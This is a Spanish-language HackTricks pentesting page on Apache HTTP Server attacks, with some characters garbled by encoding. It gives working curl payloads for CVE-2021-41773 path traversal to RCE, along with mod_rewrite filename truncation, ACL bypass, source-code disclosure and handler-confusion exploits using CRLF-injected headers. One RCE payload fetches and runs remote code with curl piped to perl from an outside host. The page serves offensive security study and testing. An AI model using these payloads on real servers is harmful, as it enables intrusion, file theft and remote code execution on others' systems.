# Apache

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Extensiones PHP ejecutables

Verifica qu√© extensiones est√° ejecutando el servidor Apache. Para buscarlas, puedes ejecutar:
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
Tambi√©n, algunos lugares donde puedes encontrar esta configuraci√≥n son:
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
## CVE-2021-41773

{% code overflow="wrap" %}
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
{% endcode %}

## Confusion Attack <a href="#a-whole-new-attack-confusion-attack" id="a-whole-new-attack-confusion-attack"></a>

Estos tipos de ataques han sido introducidos y documentados [**por Orange en esta publicaci√≥n de blog**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1) y lo siguiente es un resumen. El ataque de "confusi√≥n" b√°sicamente abusa de c√≥mo los decenas de m√≥dulos que trabajan juntos creando un Apache no funcionan perfectamente sincronizados y hacer que algunos de ellos modifiquen algunos datos inesperados puede causar una vulnerabilidad en un m√≥dulo posterior.

### Filename Confusion

#### Truncation

El **`mod_rewrite`** recortar√° el contenido de `r->filename` despu√©s del car√°cter `?` ([_**modules/mappers/mod\_rewrite.c#L4141**_](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod\_rewrite.c#L4141)). Esto no es totalmente incorrecto ya que la mayor√≠a de los m√≥dulos tratar√°n `r->filename` como una URL. Pero en otras ocasiones esto se tratar√° como una ruta de archivo, lo que causar√≠a un problema.

* **Path Truncation**

Es posible abusar de `mod_rewrite` como en el siguiente ejemplo de regla para acceder a otros archivos dentro del sistema de archivos, eliminando la √∫ltima parte de la ruta esperada a√±adiendo simplemente un `?`:
```bash
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# Expected
curl http://server/user/orange
# the output of file `/var/user/orange/profile.yml`

# Attack
curl http://server/user/orange%2Fsecret.yml%3F
#¬†the output of file `/var/user/orange/secret.yml`
```
* **Asignaci√≥n enga√±osa de RewriteFlag**

En la siguiente regla de reescritura, siempre que la URL termine en .php, se tratar√° y ejecutar√° como php. Por lo tanto, es posible enviar una URL que termine en .php despu√©s del car√°cter `?` mientras se carga en la ruta un tipo diferente de archivo (como una imagen) con c√≥digo php malicioso dentro de √©l:
```bash
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# Attacker uploads a gif file with some php code
curl http://server/upload/1.gif
# GIF89a <?=`id`;>

# Make the server execute the php code
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### **Bypass de ACL**

Es posible acceder a archivos a los que el usuario no deber√≠a poder acceder, incluso si el acceso deber√≠a ser denegado con configuraciones como:
```xml
<Files "admin.php">
AuthType Basic
AuthName "Admin Panel"
AuthUserFile "/etc/apache2/.htpasswd"
Require valid-user
</Files>
```
Esto se debe a que, por defecto, PHP-FPM recibir√° URLs que terminan en `.php`, como `http://server/admin.php%3Fooo.php` y porque PHP-FPM eliminar√° cualquier cosa despu√©s del car√°cter `?`, la URL anterior permitir√° cargar `/admin.php` incluso si la regla anterior lo prohib√≠a.

### Confusi√≥n de DocumentRoot
```bash
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```
Un dato curioso sobre Apache es que la reescritura anterior intentar√° acceder al archivo tanto desde documentRoot como desde root. As√≠ que, una solicitud a `https://server/abouth.html` verificar√° el archivo en `/var/www/html/about.html` y `/about.html` en el sistema de archivos. Lo que b√°sicamente puede ser abusado para acceder a archivos en el sistema de archivos.

#### **Divulgaci√≥n de C√≥digo Fuente del Lado del Servidor**

* **Divulgar C√≥digo Fuente CGI**

Solo agregar un %3F al final es suficiente para filtrar el c√≥digo fuente de un m√≥dulo cgi:
```bash
curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
```
* **Divulgar el c√≥digo fuente de PHP**

Si un servidor tiene diferentes dominios, siendo uno de ellos un dominio est√°tico, esto puede ser abusado para recorrer el sistema de archivos y filtrar c√≥digo php:
```bash
# Leak the config.php file of the www.local domain from the static.local domain
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
```
#### **Manipulaci√≥n de Gadgets Locales**

El principal problema con el ataque anterior es que, por defecto, la mayor√≠a del acceso al sistema de archivos ser√° denegado, como en la [plantilla de configuraci√≥n](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115) del Apache HTTP Server:
```xml
<Directory />
AllowOverride None
Require all denied
</Directory>
```
Sin embargo, los sistemas operativos [Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165) permiten por defecto `/usr/share`:
```xml
<Directory /usr/share>
AllowOverride None
Require all granted
</Directory>
```
Por lo tanto, ser√≠a posible **abusar de archivos ubicados dentro de `/usr/share` en estas distribuciones.**

**Gadget Local para Divulgaci√≥n de Informaci√≥n**

* **Apache HTTP Server** con **websocketd** puede exponer el script **dump-env.php** en **/usr/share/doc/websocketd/examples/php/**, lo que puede filtrar variables de entorno sensibles.
* Los servidores con **Nginx** o **Jetty** podr√≠an exponer informaci√≥n sensible de la aplicaci√≥n web (por ejemplo, **web.xml**) a trav√©s de sus ra√≠ces web predeterminadas ubicadas bajo **/usr/share**:
* **/usr/share/nginx/html/**
* **/usr/share/jetty9/etc/**
* **/usr/share/jetty9/webapps/**

**Gadget Local para XSS**

* En Ubuntu Desktop con **LibreOffice instalado**, explotar la funci√≥n de cambio de idioma de los archivos de ayuda puede llevar a **Cross-Site Scripting (XSS)**. Manipular la URL en **/usr/share/libreoffice/help/help.html** puede redirigir a p√°ginas maliciosas o versiones anteriores a trav√©s de **unsafe RewriteRule**.

**Gadget Local para LFI**

* Si PHP o ciertos paquetes de front-end como **JpGraph** o **jQuery-jFeed** est√°n instalados, sus archivos pueden ser explotados para leer archivos sensibles como **/etc/passwd**:
* **/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php**
* **/usr/share/javascript/jquery-jfeed/proxy.php**
* **/usr/share/moodle/mod/assignment/type/wims/getcsv.php**

**Gadget Local para SSRF**

* Utilizando **MagpieRSS's magpie\_debug.php** en **/usr/share/php/magpierss/scripts/magpie\_debug.php**, se puede crear f√°cilmente una vulnerabilidad SSRF, proporcionando una puerta de entrada a m√°s exploits.

**Gadget Local para RCE**

* Las oportunidades para **Remote Code Execution (RCE)** son vastas, con instalaciones vulnerables como un **PHPUnit** desactualizado o **phpLiteAdmin**. Estos pueden ser explotados para ejecutar c√≥digo arbitrario, mostrando el extenso potencial de la manipulaci√≥n de gadgets locales.

#### **Jailbreak desde Gadgets Locales**

Tambi√©n es posible hacer jailbreak desde las carpetas permitidas siguiendo enlaces simb√≥licos generados por el software instalado en esas carpetas, como:

* **Cacti Log**: `/usr/share/cacti/site/` -> `/var/log/cacti/`
* **Solr Data**: `/usr/share/solr/data/` -> `/var/lib/solr/data`
* **Solr Config**: `/usr/share/solr/conf/` -> `/etc/solr/conf/`
* **MediaWiki Config**: `/usr/share/mediawiki/config/` -> `/var/lib/mediawiki/config/`
* **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` -> `/etc/simplesamlphp/`

Adem√°s, abusando de enlaces simb√≥licos fue posible obtener **RCE en Redmine.**

### Confusi√≥n de Controladores <a href="#id-3-handler-confusion" id="id-3-handler-confusion"></a>

Este ataque explota la superposici√≥n en la funcionalidad entre las directivas `AddHandler` y `AddType`, que ambas pueden ser utilizadas para **habilitar el procesamiento de PHP**. Originalmente, estas directivas afectaban diferentes campos (`r->handler` y `r->content_type` respectivamente) en la estructura interna del servidor. Sin embargo, debido a c√≥digo legado, Apache maneja estas directivas de manera intercambiable bajo ciertas condiciones, convirtiendo `r->content_type` en `r->handler` si el primero est√° configurado y el segundo no.

Adem√°s, en el Apache HTTP Server (`server/config.c#L420`), si `r->handler` est√° vac√≠o antes de ejecutar `ap_run_handler()`, el servidor **utiliza `r->content_type` como el controlador**, haciendo que `AddType` y `AddHandler` sean id√©nticos en efecto.

#### **Sobrescribir Controlador para Divulgar C√≥digo Fuente PHP**

En [**esta charla**](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013\_dmitriev-maksim.pdf), se present√≥ una vulnerabilidad donde un `Content-Length` incorrecto enviado por un cliente puede hacer que Apache devuelva err√≥neamente **el c√≥digo fuente de PHP**. Esto se debi√≥ a un problema de manejo de errores con ModSecurity y el Apache Portable Runtime (APR), donde una doble respuesta lleva a sobrescribir `r->content_type` a `text/html`.\
Debido a que ModSecurity no maneja correctamente los valores de retorno, devolver√≠a el c√≥digo PHP y no lo interpretar√≠a.

#### **Sobrescribir Controlador para XXXX**

TODO: Orange a√∫n no ha divulgado esta vulnerabilidad

### **Invocar Controladores Arbitrarios**

Si un atacante puede controlar el encabezado **`Content-Type`** en una respuesta del servidor, podr√° **invocar controladores de m√≥dulo arbitrarios**. Sin embargo, en el momento en que el atacante controla esto, la mayor parte del proceso de la solicitud ya se habr√° realizado. Sin embargo, es posible **reiniciar el proceso de solicitud abusando del encabezado `Location`** porque si el **r**etornado `Status` es 200 y el encabezado `Location` comienza con una `/`, la respuesta se trata como una Redirecci√≥n del Lado del Servidor y debe ser procesada.

De acuerdo con [RFC 3875](https://datatracker.ietf.org/doc/html/rfc3875) (especificaci√≥n sobre CGI) en [Secci√≥n 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2) se define un comportamiento de Respuesta de Redirecci√≥n Local:

> El script CGI puede devolver una ruta URI y una cadena de consulta (‚Äòlocal-pathquery‚Äô) para un recurso local en un campo de encabezado Location. Esto indica al servidor que debe reprocesar la solicitud utilizando la ruta especificada.

Por lo tanto, para realizar este ataque se necesita una de las siguientes vulnerabilidades:

* Inyecci√≥n CRLF en los encabezados de respuesta CGI
* SSRF con control completo de los encabezados de respuesta

#### **Controlador Arbitrario para Divulgaci√≥n de Informaci√≥n**

Por ejemplo, `/server-status` deber√≠a ser accesible solo localmente:
```xml
<Location /server-status>
SetHandler server-status
Require local
</Location>
```
Es posible acceder configurando el `Content-Type` a `server-status` y el encabezado Location comenzando con `/`
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```
#### **Manejador Arbitrario a SSRF Completo**

Redirigiendo a `mod_proxy` para acceder a cualquier protocolo en cualquier URL:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
%0d%0a
%0d%0a
```
Sin embargo, se agrega el encabezado `X-Forwarded-For` que impide el acceso a los puntos finales de metadatos en la nube.

#### **Controlador Arbitrario para Acceder al Socket de Dominio Unix Local**

Acceda al Socket de Dominio Unix local de PHP-FPM para ejecutar un backdoor PHP ubicado en `/tmp/`:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
```
#### **Manejador Arbitrario para RCE**

La imagen oficial de [PHP Docker](https://hub.docker.com/\_/php) incluye PEAR (`Pearcmd.php`), una herramienta de gesti√≥n de paquetes PHP en l√≠nea de comandos, que puede ser abusada para obtener RCE:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
Check [**Docker PHP LFI Summary**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), escrito por [Phith0n](https://x.com/phithon\_xg) para los detalles de esta t√©cnica.

## Referencias

* [https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
